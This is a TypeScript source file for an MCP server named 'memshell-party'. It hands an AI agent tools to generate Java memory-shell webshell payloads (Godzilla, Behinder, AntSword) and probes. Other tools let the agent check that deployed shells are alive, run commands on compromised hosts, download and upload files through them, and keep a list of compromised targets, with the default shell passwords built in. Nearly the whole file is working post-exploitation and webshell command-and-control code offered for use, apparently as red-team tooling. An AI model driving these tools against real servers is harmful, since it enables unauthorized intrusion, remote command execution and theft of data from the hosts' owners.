import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { writeFileSync } from "node:fs";
import { z } from "zod";

import { MemPartyClient } from "../api/client.js";
import {
  downloadBehinder,
  execBehinder,
  testBehinder,
  uploadBehinder,
} from "../connect/behinder.js";
import {
  downloadGodzilla,
  execGodzilla,
  testGodzilla,
  uploadGodzilla,
} from "../connect/godzilla.js";
import { testSuo5 } from "../connect/suo5.js";
import type {
  ConnectTestResult,
  DownloadResult,
  ExecResult,
  TransferResult,
} from "../connect/types.js";
import { readUploadFile, resolveDownloadPath } from "../core/localfile.js";
import { logOp, opLogPath, readOps, truncateOutput, type OpCategory } from "../core/oplog.js";
import {
  autoSaveShell,
  listProjects,
  removeProject,
  removeShell,
  resolveConnection,
  saveProjectMeta,
  saveShell,
  saveShellMeta,
  targetStorePath,
} from "../core/targets.js";
import { buildMemShellRequest } from "../core/request-builder.js";
import { buildProbeRequest } from "../core/request-builder.js";
import { CLI_VERSION } from "../version.js";

function jsonContent(data: unknown) {
  return { content: [{ type: "text" as const, text: JSON.stringify(data, null, 2) }] };
}

function errorContent(err: unknown) {
  return {
    isError: true,
    content: [{ type: "text" as const, text: `Error: ${(err as Error).message}` }],
  };
}

const memShellInput = {
  server: z.string().describe("Target server, e.g. Tomcat"),
  serverVersion: z.string().optional(),
  shellTool: z.string().describe("Shell tool, e.g. Godzilla, Behinder, Command"),
  shellType: z.string().describe("Shell type, e.g. Listener, Filter, Servlet"),
  packer: z.string().describe("Packer, e.g. Base64, Jar, JSP"),
  jdk: z.string().optional().describe("java6/8/9/11/17/21 or class-file major version"),
  debug: z.boolean().optional(),
  byPassJavaModule: z.boolean().optional(),
  shrink: z.boolean().optional(),
  lambdaSuffix: z.boolean().optional(),
  probe: z.boolean().optional(),
  shellClassName: z.string().optional(),
  godzillaPass: z.string().optional(),
  godzillaKey: z.string().optional(),
  behinderPass: z.string().optional(),
  antSwordPass: z.string().optional(),
  commandParamName: z.string().optional(),
  commandTemplate: z.string().optional(),
  encryptor: z.string().optional(),
  implementationClass: z.string().optional(),
  headerName: z.string().optional(),
  headerValue: z.string().optional(),
  shellClassBase64: z.string().optional(),
  urlPattern: z.string().optional(),
  injectorClassName: z.string().optional(),
  staticInitialize: z.boolean().optional(),
};

const probeInput = {
  probeMethod: z.enum(["ResponseBody", "DNSLog", "Sleep"]),
  probeContent: z.string().describe("BasicInfo, Server, OS, JDK, Bytecode, Command"),
  packer: z.string(),
  jdk: z.string().optional(),
  debug: z.boolean().optional(),
  byPassJavaModule: z.boolean().optional(),
  shrink: z.boolean().optional(),
  lambdaSuffix: z.boolean().optional(),
  staticInitialize: z.boolean().optional(),
  shellClassName: z.string().optional(),
  host: z.string().optional(),
  seconds: z.number().optional(),
  sleepServer: z.string().optional(),
  server: z.string().optional(),
  reqParamName: z.string().optional(),
  commandTemplate: z.string().optional(),
};

const connectInput = {
  name: z
    .string()
    .optional()
    .describe(
      "saved target reference (<project>/<shell>, or a bare project holding exactly one shell) — " +
        "when set, url/tool/pass/... fall back to the saved values (see target_save/target_list)",
    ),
  url: z.string().optional().describe("URL of the deployed shell (or pass `name`)"),
  tool: z
    .enum(["godzilla", "behinder", "suo5"])
    .optional()
    .describe("shell tool to test (or taken from the saved target)"),
  pass: z
    .string()
    .optional()
    .describe("password (godzilla default: pass; behinder default: rebeyond)"),
  key: z.string().optional().describe("godzilla key (default: key)"),
  headerName: z
    .string()
    .optional()
    .describe("gate header name from generate_memshell shellToolConfig (usually User-Agent)"),
  headerValue: z
    .string()
    .optional()
    .describe("gate header value from generate_memshell shellToolConfig — required for MemShellParty shells"),
  suo5Mode: z
    .enum(["auto", "v2", "v1"])
    .optional()
    .describe("suo5 protocol variant (default: auto)"),
  insecure: z.boolean().optional().describe("skip TLS certificate verification"),
  timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
};

const execInput = {
  name: z
    .string()
    .optional()
    .describe(
      "saved target reference (<project>/<shell>, or a bare project holding exactly one shell) — " +
        "when set, url/tool/pass/... fall back to the saved values (see target_save/target_list)",
    ),
  url: z.string().optional().describe("URL of the deployed shell (or pass `name`)"),
  tool: z
    .enum(["godzilla", "behinder"])
    .optional()
    .describe("shell tool to execute through (or taken from the saved target)"),
  command: z.string().describe("command line to execute on the target"),
  pass: z
    .string()
    .optional()
    .describe("password (godzilla default: pass; behinder default: rebeyond)"),
  key: z.string().optional().describe("godzilla key (default: key)"),
  os: z
    .enum(["auto", "windows", "linux"])
    .optional()
    .describe(
      "godzilla only: remote OS for the shell wrapper (default: auto — one extra request to detect; behinder detects the OS inside its payload)",
    ),
  headerName: z
    .string()
    .optional()
    .describe("gate header name from generate_memshell shellToolConfig (usually User-Agent)"),
  headerValue: z
    .string()
    .optional()
    .describe("gate header value from generate_memshell shellToolConfig — required for MemShellParty shells"),
  insecure: z.boolean().optional().describe("skip TLS certificate verification"),
  timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
};

/** Connection fields shared by download_file / upload_file (no command/os). */
const transferConnInput = {
  name: execInput.name,
  url: execInput.url,
  tool: execInput.tool,
  pass: execInput.pass,
  key: execInput.key,
  headerName: execInput.headerName,
  headerValue: execInput.headerValue,
  insecure: execInput.insecure,
  timeoutMs: execInput.timeoutMs,
  remoteCharset: z
    .string()
    .optional()
    .describe(
      "godzilla only: charset for non-ASCII remote paths (any Java label, e.g. GBK; default UTF-8)",
    ),
};

const downloadInput = {
  ...transferConnInput,
  remotePath: z.string().describe("remote file path to download"),
  localPath: z
    .string()
    .optional()
    .describe(
      "local destination (default: ./<remote basename>; an existing directory keeps the basename)",
    ),
  force: z
    .boolean()
    .optional()
    .describe("overwrite the local file when it already exists (default: refuse)"),
};

const uploadInput = {
  ...transferConnInput,
  localPath: z.string().describe("local file to upload (max 64 MiB)"),
  remotePath: z.string().describe("remote destination path (overwritten when it exists)"),
};

const targetSaveInput = {
  project: z.string().describe("project name (created when missing)"),
  shell: z.string().describe("shell name inside the project"),
  url: z.string().describe("URL of the deployed shell"),
  tool: z.enum(["godzilla", "behinder", "suo5"]).describe("shell tool"),
  pass: z.string().optional().describe("password"),
  key: z.string().optional().describe("godzilla key"),
  headerName: z.string().optional().describe("gate header name (shellToolConfig.headerName)"),
  headerValue: z.string().optional().describe("gate header value (shellToolConfig.headerValue)"),
  insecure: z.boolean().optional().describe("skip TLS certificate verification"),
  projectRemark: z.string().optional().describe("project remark (merged into the project)"),
  projectCategory: z.string().optional().describe("project category (merged into the project)"),
  shellRemark: z.string().optional().describe("remark for this shell"),
};

export function createMcpServer(client: MemPartyClient): McpServer {
  const server = new McpServer({ name: "memshell-party", version: CLI_VERSION });

  server.registerTool(
    "list_servers",
    { title: "List servers", description: "List supported servers and their shell types" },
    async () => {
      try {
        return jsonContent(await client.getServers());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_config",
    {
      title: "List full config",
      description: "List every server's shell tools and their supported shell types",
    },
    async () => {
      try {
        return jsonContent(await client.getConfig());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_packers",
    { title: "List packers", description: "List packers as a parent/child tree" },
    async () => {
      try {
        return jsonContent(await client.getPackerTree());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_command_configs",
    {
      title: "List command configs",
      description: "List Command-tool encryptors and implementation classes",
    },
    async () => {
      try {
        return jsonContent(await client.getCommandConfigs());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "generate_memshell",
    { title: "Generate memory shell", description: "Generate a Java memory shell payload", inputSchema: memShellInput },
    async (args) => {
      const meta = {
        server: args.server,
        serverVersion: args.serverVersion,
        shellTool: args.shellTool,
        shellType: args.shellType,
        packer: args.packer,
        jdk: args.jdk,
      };
      const started = Date.now();
      try {
        const response = await client.generateMemShell(buildMemShellRequest(args));
        logOp({
          category: "gen",
          action: "gen",
          ok: true,
          durationMs: Date.now() - started,
          detail: `${response.memShellResult.shellClassName} (${response.memShellResult.shellSize} bytes)`,
          meta,
        });
        return jsonContent(response);
      } catch (err) {
        logOp({
          category: "gen",
          action: "gen",
          ok: false,
          durationMs: Date.now() - started,
          error: (err as Error).message,
          meta,
        });
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "generate_probe",
    { title: "Generate probe shell", description: "Generate a probe/detection shell payload", inputSchema: probeInput },
    async (args) => {
      const meta = {
        probeMethod: args.probeMethod,
        probeContent: args.probeContent,
        packer: args.packer,
        jdk: args.jdk,
      };
      const started = Date.now();
      try {
        const response = await client.generateProbe(buildProbeRequest(args));
        logOp({
          category: "probe",
          action: "probe",
          ok: true,
          durationMs: Date.now() - started,
          detail: `${response.probeShellResult.shellClassName} (${response.probeShellResult.shellSize} bytes)`,
          meta,
        });
        return jsonContent(response);
      } catch (err) {
        logOp({
          category: "probe",
          action: "probe",
          ok: false,
          durationMs: Date.now() - started,
          error: (err as Error).message,
          meta,
        });
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "parse_classname",
    {
      title: "Parse class name",
      description: "Parse the fully-qualified class name from base64-encoded .class bytes",
      inputSchema: { classBase64: z.string().describe("base64-encoded .class file bytes") },
    },
    async ({ classBase64 }) => {
      try {
        return jsonContent({ className: await client.parseClassName(classBase64) });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "server_version",
    { title: "Server version", description: "Get the backend server version info" },
    async () => {
      try {
        return jsonContent(await client.getVersion());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "connect_test",
    {
      title: "Test shell connection",
      description:
        "Test whether a deployed Godzilla / Behinder / suo5 shell is alive and the " +
        "credentials work, by performing the tool's real protocol handshake. " +
        "Pass a saved target `name`, or url+tool with the gate header " +
        "(headerName/headerValue) from generate_memshell output for MemShellParty shells. " +
        "On success the profile is auto-saved and the canonical name returned as " +
        "`savedAs` — reuse it as `name` in later calls.",
      inputSchema: connectInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
        };
        let result: ConnectTestResult;
        switch (conn.tool) {
          case "godzilla":
            result = await testGodzilla(conn.url, conn.pass ?? "pass", conn.key ?? "key", common);
            break;
          case "behinder":
            result = await testBehinder(conn.url, conn.pass ?? "rebeyond", common);
            break;
          case "suo5":
            result = await testSuo5(conn.url, { ...common, mode: args.suo5Mode });
            break;
          default:
            throw new Error(`unknown tool ${String(conn.tool)}`);
        }
        // a successful handshake proves the credentials — keep them as a named target
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        logOp({
          category: "connect",
          action: "connect",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          detail: result.detail,
          error: result.error,
        });
        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "exec_command",
    {
      title: "Execute command on shell",
      description:
        "Execute a command line on a deployed Godzilla / Behinder shell and return its " +
        "stdout+stderr. Uses the tool's real protocol (Godzilla execCommand method / " +
        "Behinder Cmd payload). Run connect_test first to verify credentials; pass a " +
        "saved target `name`, or url+tool with the same gate header " +
        "(headerName/headerValue) for MemShellParty shells. On success the profile " +
        "is auto-saved and the canonical name returned as `savedAs`.",
      inputSchema: execInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
        };
        let result: ExecResult;
        switch (conn.tool) {
          case "godzilla":
            result = await execGodzilla(
              conn.url,
              conn.pass ?? "pass",
              conn.key ?? "key",
              args.command,
              { ...common, os: args.os },
            );
            break;
          case "behinder":
            result = await execBehinder(conn.url, conn.pass ?? "rebeyond", args.command, common);
            break;
          default:
            throw new Error(`exec supports godzilla | behinder (got ${String(conn.tool)})`);
        }
        // a successful exec proves the credentials — keep them as a named target
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        const truncated = result.output !== undefined ? truncateOutput(result.output) : null;
        logOp({
          category: "exec",
          action: "exec",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          command: args.command,
          output: truncated?.output,
          outputTruncated: truncated?.truncated || undefined,
          error: result.error,
        });
        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "download_file",
    {
      title: "Download file from shell",
      description:
        "Download a file from a deployed Godzilla / Behinder shell to the local machine. " +
        "Chunked transfer with integrity verification (Godzilla: remote size; Behinder: MD5). " +
        "Pass a saved target `name`, or url+tool with the gate header for MemShellParty shells. " +
        "The local file is never overwritten unless force=true. On success the profile is " +
        "auto-saved and the canonical name returned as `savedAs`.",
      inputSchema: downloadInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
        };
        // decide + validate the local destination before touching the network
        const localPath = resolveDownloadPath(args.remotePath, args.localPath, args.force ?? false);

        let result: DownloadResult;
        switch (conn.tool) {
          case "godzilla":
            result = await downloadGodzilla(
              conn.url,
              conn.pass ?? "pass",
              conn.key ?? "key",
              args.remotePath,
              { ...common, remoteCharset: args.remoteCharset },
            );
            break;
          case "behinder":
            result = await downloadBehinder(
              conn.url,
              conn.pass ?? "rebeyond",
              args.remotePath,
              common,
            );
            break;
          default:
            throw new Error(`download supports godzilla | behinder (got ${String(conn.tool)})`);
        }
        if (result.ok && result.data !== undefined) {
          try {
            writeFileSync(localPath, result.data);
          } catch (err) {
            result = {
              ...result,
              ok: false,
              error: `download succeeded but writing ${localPath} failed: ${(err as Error).message}`,
            };
          }
        }
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        logOp({
          category: "download",
          action: "download",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          detail: result.ok
            ? `${args.remotePath} -> ${localPath} (${result.bytes ?? 0} bytes)`
            : undefined,
          error: result.error,
          meta: { remotePath: args.remotePath, localPath, bytes: result.bytes },
        });
        const { data: _data, ...wire } = result;
        return jsonContent({ ...wire, localPath, savedAs });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "upload_file",
    {
      title: "Upload file to shell",
      description:
        "Upload a local file to a deployed Godzilla / Behinder shell, overwriting the remote " +
        "path (max 64 MiB). Chunked transfer with integrity verification (Godzilla: remote " +
        "size; Behinder: MD5). Pass a saved target `name`, or url+tool with the gate header " +
        "for MemShellParty shells. On success the profile is auto-saved and the canonical " +
        "name returned as `savedAs`.",
      inputSchema: uploadInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
        };
        // read + validate the local file before touching the network
        const data = readUploadFile(args.localPath);

        let result: TransferResult;
        switch (conn.tool) {
          case "godzilla":
            result = await uploadGodzilla(
              conn.url,
              conn.pass ?? "pass",
              conn.key ?? "key",
              args.remotePath,
              data,
              { ...common, remoteCharset: args.remoteCharset },
            );
            break;
          case "behinder":
            result = await uploadBehinder(
              conn.url,
              conn.pass ?? "rebeyond",
              args.remotePath,
              data,
              common,
            );
            break;
          default:
            throw new Error(`upload supports godzilla | behinder (got ${String(conn.tool)})`);
        }
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        logOp({
          category: "upload",
          action: "upload",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          detail: result.ok
            ? `${args.localPath} -> ${args.remotePath} (${result.bytes ?? 0} bytes)`
            : undefined,
          error: result.error,
          meta: { localPath: args.localPath, remotePath: args.remotePath, bytes: result.bytes },
        });
        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_save",
    {
      title: "Save shell target",
      description:
        "Save a shell connection profile as <project>/<shell> so later connect_test / " +
        "exec_command calls only need the name. A project groups several shells and " +
        "carries an optional remark and category. Overwrites an existing shell.",
      inputSchema: targetSaveInput,
    },
    async (args) => {
      try {
        if (args.projectRemark !== undefined || args.projectCategory !== undefined) {
          saveProjectMeta(args.project, {
            remark: args.projectRemark,
            category: args.projectCategory,
          });
        }
        const stored = saveShell(args.project, args.shell, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
          remark: args.shellRemark,
        });
        logOp({
          category: "save",
          action: "save",
          targetName: `${args.project}/${args.shell}`,
          url: args.url,
          tool: args.tool,
          ok: true,
          detail: "saved",
          meta: {
            projectRemark: args.projectRemark,
            projectCategory: args.projectCategory,
            shellRemark: args.shellRemark,
          },
        });
        return jsonContent({ project: args.project, shell: args.shell, ...stored });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_note",
    {
      title: "Set remark/category",
      description:
        "Set or clear (empty string) a project's remark and/or category — or a shell's " +
        "remark when `shell` is given.",
      inputSchema: {
        project: z.string(),
        shell: z.string().optional().describe("when set, only `remark` applies (to the shell)"),
        remark: z.string().optional().describe('remark ("" to clear)'),
        category: z.string().optional().describe('project category ("" to clear; projects only)'),
      },
    },
    async (args) => {
      try {
        if (args.shell) {
          if (args.category !== undefined) {
            throw new Error("category only applies to projects");
          }
          const updated = saveShellMeta(args.project, args.shell, { remark: args.remark });
          logOp({
            category: "note",
            action: "note",
            targetName: `${args.project}/${args.shell}`,
            ok: true,
            detail: `remark=${updated.remark ?? "-"}`,
          });
          return jsonContent({
            project: args.project,
            shell: args.shell,
            remark: updated.remark,
          });
        }
        const updated = saveProjectMeta(args.project, {
          remark: args.remark,
          category: args.category,
        });
        logOp({
          category: "note",
          action: "note",
          targetName: args.project,
          ok: true,
          detail: `category=${updated.category ?? "-"} remark=${updated.remark ?? "-"}`,
        });
        return jsonContent({ project: args.project, ...updated, shells: Object.keys(updated.shells) });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_list",
    {
      title: "List saved targets",
      description:
        "List saved projects (remark, category) and their shells. Use the " +
        "<project>/<shell> references as `name` in connect_test / exec_command.",
      inputSchema: {
        category: z.string().optional().describe("only show projects in this category"),
      },
    },
    async (args) => {
      try {
        const all = listProjects();
        const filtered: Record<string, unknown> = {};
        for (const [name, p] of Object.entries(all)) {
          if (args.category !== undefined && p.category !== args.category) continue;
          filtered[name] = p;
        }
        return jsonContent({ storePath: targetStorePath(), projects: filtered });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_remove",
    {
      title: "Remove saved target",
      description: "Remove a whole project, or a single shell when `shell` is given.",
      inputSchema: {
        project: z.string(),
        shell: z.string().optional(),
      },
    },
    async (args) => {
      try {
        const removed = args.shell
          ? removeShell(args.project, args.shell)
          : removeProject(args.project);
        if (!removed) throw new Error(`unknown target ${args.project}/${args.shell ?? ""}`);
        logOp({
          category: "remove",
          action: "remove",
          targetName: args.shell ? `${args.project}/${args.shell}` : args.project,
          ok: true,
          detail: "removed",
        });
        return jsonContent({ removed: true, project: args.project, shell: args.shell });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "log_list",
    {
      title: "List operation log",
      description:
        "Read the global operation log (every gen/probe/connect/exec/save/note/remove op), " +
        "newest first. Filter by category and/or target.",
      inputSchema: {
        category: z
          .enum(["gen", "probe", "connect", "exec", "download", "upload", "save", "note", "remove"])
          .optional()
          .describe("operation category"),
        target: z
          .string()
          .optional()
          .describe("project name, project/shell, or a URL substring (e.g. host)"),
        limit: z.number().optional().describe("max entries (default 50)"),
      },
    },
    async (args) => {
      try {
        const entries = readOps({
          category: args.category as OpCategory | undefined,
          target: args.target,
          limit: args.limit,
        });
        return jsonContent({ logPath: opLogPath(), entries });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  return server;
}

/** Start the MCP server over stdio. */
export async function startMcpStdio(client: MemPartyClient): Promise<void> {
  const server = createMcpServer(client);
  const transport = new StdioServerTransport();
  await server.connect(transport);
}
